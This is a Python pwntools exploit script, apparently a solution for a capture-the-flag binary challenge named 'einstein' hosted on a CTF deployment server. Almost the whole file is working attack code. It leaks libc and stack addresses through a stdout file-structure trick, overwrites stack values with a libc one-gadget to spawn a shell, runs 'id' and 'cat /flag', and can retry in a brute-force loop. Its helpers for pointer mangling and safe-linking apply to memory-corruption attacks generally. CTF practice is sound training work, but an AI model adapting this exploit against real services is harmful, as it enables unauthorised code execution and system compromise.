from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

file = 'einstein'
exe_args = []
PREFIX = (b"?")
speed = 0.2

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    b *handle+312
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    host = args.HOST if args.HOST else 'einstein-b16b01bd685fdeab.deploy.phreaks.fr'
    port = args.PORT if args.PORT else 443
    io = remote(host, port, ssl=True)

def launch_docker():
    global file, io
    io = remote("localhost", 5000)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", "run"], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rol(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: ror(addr, 17) ^ cookie
ptr_getcookie = lambda mangled, demangled: ptr_demangle(mangled, demangled)
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def printx(**kwargs):
    for k, v in kwargs.items():
        success("%s: %#x" % (k, v))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = exe.libc
context.binary = exe

tries = 0

def exploit():
    choice(0x400000)
    choice(-0x10+0x404000+0x1ff7c8)


    sa(b"wisely.", p8(0xc8)) # leak with stdout file
    sleep(speed)


    leak = recvu(b"Everything")[6:]
    stack = u64(leak[0x98:]) + 0x10
    libc.address = u64(leak[0x50:]) - 0x1fd270
    printx(libc=libc.address, stack=stack)


    def write(addr, v):
        sl(str(addr).encode())
        sl(str(v).encode())

    write(stack-0x130, libc.address+0xeb66b) # one gadget
    write(stack-0x1a0, 0) # (one gadget require 0 here)



    sl(b"id")
    if io.recvuntil(b"uid=", timeout=0.5) == b"":
        raise EOFError
    
    sleep(speed)
    sl(b"cat /flag")

    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()
